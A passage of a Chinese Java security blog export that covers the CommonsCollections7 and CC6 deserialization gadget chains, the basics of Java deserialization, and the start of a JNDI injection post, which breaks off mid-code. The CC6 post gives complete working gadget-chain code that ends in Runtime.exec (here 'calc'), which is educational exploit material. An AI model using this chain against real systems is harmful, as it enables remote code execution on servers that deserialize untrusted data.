<p>最后因为<code>lazyMap2</code>中并没有<code>yy</code>这个<code>key</code>，因此会执行一个<code>map.put(&quot;yy&quot;,&quot;yy&quot;)</code>的操作添加，所以在 POC 中，我们最后要把<code>lazyMap2</code>的<code>yy</code>给删除掉。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.anquanke.com/post/id/240040">ysoserial CommonsCollections7 &amp; C3P0 详细分析</a>)</p>
<p><a href="https://www.anquanke.com/post/id/248169">CC第7链HashTable触发点深入分析</a></p>
<p><a href="https://www.cnblogs.com/tr1ple/p/12427015.html">java反序列化-ysoserial-调试分析总结篇(7)</a></p>
<p><a href="http://myblog.ac.cn/archives/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcommoncollections7%E5%88%A9%E7%94%A8%E9%93%BE">JAVA反序列化之CommonCollections7利用链</a></p>
<p><a href="https://github.com/dota-st/JavaSec/blob/master/03-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%93%E5%8C%BA/8-CommonsCollections7/CommonsCollections7.md">CommonsCollections7利用链分析</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化CommonsCollections篇-CC6(最好用的CC链)</title>
    <url>/2024/05/25/JAVA%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC6/</url>
    <content><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
<li><p>JAVA版本JAVA 21</p>
</li>
<li><p>commons-collections 3.2.1</p>
</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure>

<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>CC1现在来说的话比较鸡肋。因为在8u71以后<code>AnnotationInvocationHandler.readObject()</code>改变了。</p>
<p>为了解决高版本的利用问题ysoserial给出了解决方案CommonsCollections6，也就是我们平常称的CC6。</p>
<p>其实后面利用链和CC1是一样的,<code>LazyMap.get()</code></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240525145206477.png" alt="image-20240525145206477"></p>
<h2 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h2><p>从ysoserial可以看出链首是HashMap，其实HashMap我们挺熟悉。<code>HashMap.readObject()-&gt;HashMap.put()-&gt;HashMap.hash().(key)HashCode()</code></p>
<p>所以现在只需要有一个类的<code>HashCode()</code>调用了<code>get()</code>就可以将这整段链链接起来。</p>
<h3 id="攻击链分析"><a href="#攻击链分析" class="headerlink" title="攻击链分析"></a>攻击链分析</h3><p>作者是发现了<code>TiedMapEntry.HashCode().getValue()</code>中调用了<code>get()</code>,那这就可以把前后两段链链接起来。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240525163703284.png" alt="image-20240525163703284"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240525163727555.png" alt="image-20240525163727555"></p>
<p>完整利用链</p>
<p><img src="https://image.sp4rks.xyz/2024/06/CC6.png" alt="CC6"></p>
<h3 id="实现攻击链"><a href="#实现攻击链" class="headerlink" title="实现攻击链"></a>实现攻击链</h3><p>后面代码执行的部分和CC1是一样的，复制就行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <br>    <br>    	<span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);<br></code></pre></td></tr></table></figure>

<p>接下来直接<code>new TiedMapEntry</code>，看<code>TiedMapEntry</code>的构造器，所以map可以直接传入之前的chainedTransformer，key随便传。</p>
<p>然后<code>new HashMap</code>作为入口，放入把tiedMapEntry放进key。为什么把tiedMapEntry放进key而不是放进value中？因为<code>HashMap.readObject</code>是对key进行<code>hash()</code>。同样的value随便传。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240525162706680.png" alt="image-20240525162706680"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240525162851644.png" alt="image-20240525162851644"></p>
<p>但是我们在URLDNS那条链里面就有经验了，<code>HashMap.put</code>就会对key进行<code>hash()</code>，也就是对key调用<code>hashCode()</code>，会直接导致在序列化的时候直接走完这条链。</p>
<p>所以得更改一下，改法很多，思路其实都是一样的，put时放进一个不能让链连接起来的对象或者方法，序列化的时候改回设想的调用链，让链能连接起来。</p>
<p>这里主要写了两种方式:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC6</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-comment">//改法一:先把不把transformers放进chainedTransformer中，这里new了个ConstantTransformer[]&#123;&#125;，ChainedTransformer就调用不了transformers</span><br><span class="hljs-comment">//        ChainedTransformer chainedTransformer = new ChainedTransformer(new ConstantTransformer[]&#123;&#125;);</span><br><br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><span class="hljs-comment">//        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);</span><br><br>        <span class="hljs-comment">//改法二:先不把chainedTransformer放进LazyMap.decorate()，这样lazyMap也找不到后半条链</span><br>        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><br><br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map2.put(tiedMapEntry, <span class="hljs-string">&quot;bbb&quot;</span>);<br><span class="hljs-comment">//        lazyMap.remove(&quot;aaa&quot;);</span><br><br>        <span class="hljs-comment">//改法一：通过反射将transformers放进chainedTransformer中</span><br><span class="hljs-comment">//        Class&lt;ChainedTransformer&gt; c2 = ChainedTransformer.class;</span><br><span class="hljs-comment">//        Field iTransformersField = c2.getDeclaredField(&quot;iTransformers&quot;);</span><br><span class="hljs-comment">//        iTransformersField.setAccessible(true);</span><br><span class="hljs-comment">//        iTransformersField.set(chainedTransformer, transformers);</span><br><br>        <span class="hljs-comment">//改法二：通过反射将chainedTransformer放进lazyMap中</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factoryField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        factoryField.set(lazyMap, chainedTransformer);<br><br><br><br><br>        <span class="hljs-comment">//生成序列化字符串</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(map2);<br>        oos.close();<br><br>        <span class="hljs-comment">//本地测试触发</span><br>        System.out.println(barr);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> ois.readObject();<br><br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="遇到一个小问题"><a href="#遇到一个小问题" class="headerlink" title="遇到一个小问题"></a>遇到一个小问题</h3><p>发现这时候反序列化不能成功执行</p>
<p>我们可以尝试调试一下，添加一个lnline Watches，可以看到执行的时候<code>map.put(key，value)</code>把<code>key:&quot;aaa&quot;</code>put进去了，导致我们反序列化得时候<code>if(map.containsKey(key) == false)</code>判定失败，因为这时候<code>if(map.containsKey(key)==true)</code>，然后就走不进这个if，导致调用<code>transform()</code>方法失败，最终导致链不能成功执行。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240525204315232.png" alt="image-20240525204315232"></p>
<p>解决方法很简单，等put完后，<code>remove()</code>掉就行，随后就可以正常执行反序列化</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240525163825585.png" alt="image-20240525163825585"></p>
<h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC6</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-comment">//改法一:先把不把transformers放进chainedTransformer中，这里new了个ConstantTransformer[]&#123;&#125;，ChainedTransformer就调用不了transformers</span><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>[]&#123;&#125;);<br><br><br><span class="hljs-comment">//        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);<br><br>        <span class="hljs-comment">//改法二:先不把chainedTransformer放进LazyMap.decorate()，这样lazyMap也找不到后半条链</span><br><span class="hljs-comment">//        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));</span><br><br><br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map2.put(tiedMapEntry, <span class="hljs-string">&quot;bbb&quot;</span>);<br>        lazyMap.remove(<span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        <span class="hljs-comment">//改法一：通过反射将transformers放进chainedTransformer中</span><br>        Class&lt;ChainedTransformer&gt; c2 = ChainedTransformer.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">iTransformersField</span> <span class="hljs-operator">=</span> c2.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        iTransformersField.setAccessible(<span class="hljs-literal">true</span>);<br>        iTransformersField.set(chainedTransformer, transformers);<br><br>        <span class="hljs-comment">//改法二：通过反射将chainedTransformer放进lazyMap中</span><br><span class="hljs-comment">//        Class c = LazyMap.class;</span><br><span class="hljs-comment">//        Field factoryField = c.getDeclaredField(&quot;factory&quot;);</span><br><span class="hljs-comment">//        factoryField.setAccessible(true);</span><br><span class="hljs-comment">//        factoryField.set(lazyMap, chainedTransformer);</span><br><br><br><br><br>        <span class="hljs-comment">//生成序列化字符串</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(map2);<br>        oos.close();<br><br>        <span class="hljs-comment">//本地测试触发</span><br>        System.out.println(barr);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br><span class="hljs-comment">//        Object o = ois.readObject();</span><br><br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>



<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.bilibili.com/video/BV1yP4y1p7N7/?spm_id_from=333.999.0.0&vd_source=d195054a6a081ba07486dcc86c6ba707">Java反序列化CommonsCollections篇(二)-最好用的CC链</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA反序列化</title>
    <url>/2024/05/21/JAVA%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h2 id="为什么JAVA需要反序列化"><a href="#为什么JAVA需要反序列化" class="headerlink" title="为什么JAVA需要反序列化"></a>为什么JAVA需要反序列化</h2><p><strong>1. 数据持久化</strong></p>
<p>序列化可以将 Java 对象转换为字节序列，并将其存储到文件中或数据库中，该字节包含对象的数据、对象的类型、对象的存储属性。这使得 Java 程序可以很容易地保存和加载数据，而无需每次都重新创建对象。例如，一个 Java 应用程序可以将用户数据序列化到文件中，以便在下次启动时加载。</p>
<p><strong>2. 远程通信</strong></p>
<p>序列化还可以用于在网络上传输 Java 对象。例如，一个 Java 应用程序可以将一个对象序列化并发送给另一个应用程序，或者将一个对象从客户端发送到服务器。这使得 Java 程序可以很容易地在不同的机器之间共享数据。</p>
<h2 id="序列化与反序列化的实现"><a href="#序列化与反序列化的实现" class="headerlink" title="序列化与反序列化的实现"></a>序列化与反序列化的实现</h2><p>序列化对象会通过<code>ObjectOutputStream</code>的<code>writeObject</code>方法将一个对象写入到文件中。</p>
<p>而反序列化是使用了<code>ObjectInputStream类</code>的<code>readObject</code> 方法进行读取并还原成在序列化前的一个类。</p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>定义了一个Person类，实现了<strong>Serializable</strong>接口，有两个属性和一个构造方法，重写了<code>toString()</code></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240521135149134.png" alt="image-20240521135149134"></p>
<p>可以看到<strong>Serializable</strong>是空接口，可以理解为是一个标记，实现了它才能序列化。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240521135203323.png" alt="image-20240521135203323"></p>
<p>定义了一个serialize静态方法</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240521135344209.png" alt="image-20240521135344209"></p>
<p>序列化的结果</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240521135254681.png" alt="image-20240521135254681"></p>
<p>反序列化：还原成在序列化前的一个类。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240521135403252.png" alt="image-20240521135403252"></p>
<h2 id="为什么会产生安全问题"><a href="#为什么会产生安全问题" class="headerlink" title="为什么会产生安全问题"></a>为什么会产生安全问题</h2><p>序列化的数据，上传到服务器，如果服务器有反序列化的操作，那其中的代码一定会执行，给予了攻击者在服务器执行代码的能力。</p>
<p>(传入一个序列化数据，服务器反序列化操作一定会执行<code>readObject()</code>方法)</p>
<h2 id="寻找入口类"><a href="#寻找入口类" class="headerlink" title="寻找入口类"></a>寻找入口类</h2><p>怎么算是一个好的入口类？实现了<code>Serializable</code>接口,重写了readObject，参数类型宽泛，最好JDK自带。</p>
<p>这样我们很容易就会想到Map，HashMap实现了<strong>Serializable</strong>接口，重写了<code>readObject()</code>方法。（在类里面重写了<code>readObject()</code>方法，JDK会自动调用重写的<code>readObject()</code>方法，而不调用原生的<code>readObject()</code>）<img src="https://image.sp4rks.xyz/2024/06/image-20240521141902419.png" alt="image-20240521141902419"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240521142108326.png" alt="image-20240521142108326"></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>JNDI注入</title>
    <url>/2025/02/11/JAVA%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/JNDI%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="JNDI概述"><a href="#JNDI概述" class="headerlink" title="JNDI概述"></a>JNDI概述</h1><p>JNDI(Java Naming and Directory Interface，Java命名和目录接口)，为开发人员查找和访问各种资源提供了统一的通用接口，用于访问各种命名和目录服务。</p>
<h2 id="JNDI-主要支持的服务协议"><a href="#JNDI-主要支持的服务协议" class="headerlink" title="JNDI 主要支持的服务协议"></a>JNDI 主要支持的服务协议</h2><ul>
<li><strong>RMI（远程方法调用）：</strong> 允许 Java 程序通过 JNDI 查找并调用远程对象。</li>
<li><strong>LDAP（轻量级目录访问协议）：</strong> 用于访问和查询存储在 LDAP 目录中的信息，如用户和配置数据。</li>
<li><strong>CORBA（公共对象请求代理体系结构）：</strong> 一个分布式对象系统的标准，可以通过 JNDI 查找和访问 CORBA 对象。</li>
<li><strong>DNS（域名系统）：</strong> 用于解析域名到 IP 地址的映射。</li>
</ul>
<h2 id="Naming-Service-命名服务"><a href="#Naming-Service-命名服务" class="headerlink" title="Naming Service (命名服务)"></a>Naming Service (命名服务)</h2><p>简单来讲就是将名称绑定到对象，并通过名称查找对象。例如，RMI 将远程对象与名称绑定，客户端可以通过名称查找并调用远程对象。</p>
<p>这其中又有几个概念，了解有助于后续代码理解：</p>
<ul>
<li><strong>Bindings</strong>：表示名称与对象的绑定关系。例如，DNS 中域名与 IP 地址的绑定，RMI 中远程对象与名称的绑定，文件系统中文件名与文件的绑定等。</li>
<li><strong>Context</strong>：上下文，是一组名称到对象的绑定关系的集合。我们可以在某个上下文中查找指定名称的对象。比如，文件系统中的一个目录就是一个上下文，其中的文件和子目录可以看作是子上下文。</li>
<li><strong>References</strong>：在一个实际的命名服务中，有些对象可能无法直接存储在系统内，这时它们便以引用的形式进行存储，可以理解为 C&#x2F;C++ 中的指针。引用中包含了获取实际对象所需的信息，甚至对象的实际状态。比如文件系统中实际根据名称打开的文件是一个整数 fd (file descriptor)，这就是一个引用，内核根据这个引用值去找到磁盘中的对应位置和读写偏移。</li>
</ul>
<h2 id="Directory-Service-目录服务"><a href="#Directory-Service-目录服务" class="headerlink" title="Directory Service (目录服务)"></a>Directory Service (目录服务)</h2><p>可以简单的理解是命名服务的扩展，不仅提供命名服务的功能，还可以存储关于对象的属性信息。</p>
<p>常见的目录服务有：</p>
<ul>
<li>LDAP（轻量级目录访问协议）：可以存储用户信息、配置参数等</li>
</ul>
<h2 id="ObjectFactory"><a href="#ObjectFactory" class="headerlink" title="ObjectFactory"></a>ObjectFactory</h2><p> JNDI 中的一种机制，用于把Naming Service和Directory Service的数据转换为 Java 对象。比如，当 JNDI 查找某个对象时，可能会遇到存储在服务中的数据是某种格式（比如字符串、字节流等），而需要 <code>ObjectFactory</code> 来将其转换为 Java 对象或者基本数据类型。</p>
<p>通常，<strong>每个服务提供者</strong>（例如 RMI、LDAP）可能有多个 <code>ObjectFactory</code> 实现，它们负责将特定类型的对象数据转换为 Java 对象。</p>
<p>JNDI注入的问题就是出在可远程下载自定义的ObjectFactory类上。</p>
<h2 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h2><p>一句话来讲，JNDI就是一组API接口。每一个对象都有一组唯一的键值绑定，将名字和对象绑定，可以通过名字检索指定的对象，而该对象可能存储在RMI、LDAP、CORBA等等。</p>
<p>其中RMI在前面我们也研究了它的反序列化隐患，JNDI 中也原生支持 RMI 协议，因此 RMI 的反序列化隐患同样会在 JNDI 中存在。(这一部分不会在本文突出，有需求可以去看组长<a href="https://www.bilibili.com/video/BV1P54y1Z7Lf/?spm_id_from=333.1387.upload.video_card.click&vd_source=d195054a6a081ba07486dcc86c6ba707">视频</a>)</p>
<h1 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h1><p>下面是以RMI服务为例的一个JNDI的例子:</p>
<p>在JNDI中提供了绑定和查找的方法：</p>
<ul>
<li>bind：将名称绑定到对象中；</li>
<li>lookup：通过名字检索执行的对象；</li>
</ul>
<p>先定义一个Person类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Remote</span>, Serializable &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> String password;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getPassword</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> password;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setPassword</span><span class="hljs-params">(String password)</span> &#123;<br>        <span class="hljs-built_in">this</span>.password = password;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;name:&quot;</span> + name + <span class="hljs-string">&quot; password:&quot;</span> + password;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>Server类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.Context;<br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Server</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initPerson</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//创建一个RMI注册表 </span><br>        LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-comment">//配置JNDI工厂和JNDI的url和端口。如果没有配置这些信息，会出现NoInitialContextException异常</span><br>        System.setProperty(Context.INITIAL_CONTEXT_FACTORY, <span 